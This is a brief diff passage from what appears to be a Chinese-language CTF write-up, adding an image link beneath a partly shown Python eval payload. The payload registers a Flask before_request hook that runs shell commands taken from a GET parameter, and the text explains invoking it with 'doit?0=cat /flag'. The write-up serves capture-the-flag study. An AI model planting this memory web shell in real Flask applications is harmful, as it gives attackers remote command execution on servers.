@@ -33,3 +33,4 @@ e=eval("__import__(\"sys\").modules['__main__'].__dict__['app'].before_request_f
 :__import__('os').popen(request.args.get('0')).read())")
 ```
 打入之后会在当前路由加载前执行get传入的命令，我们直接访问当前路由`doit?0=cat /flag` 即可
+![](assets/？CTF/file-20251202164749968.png)
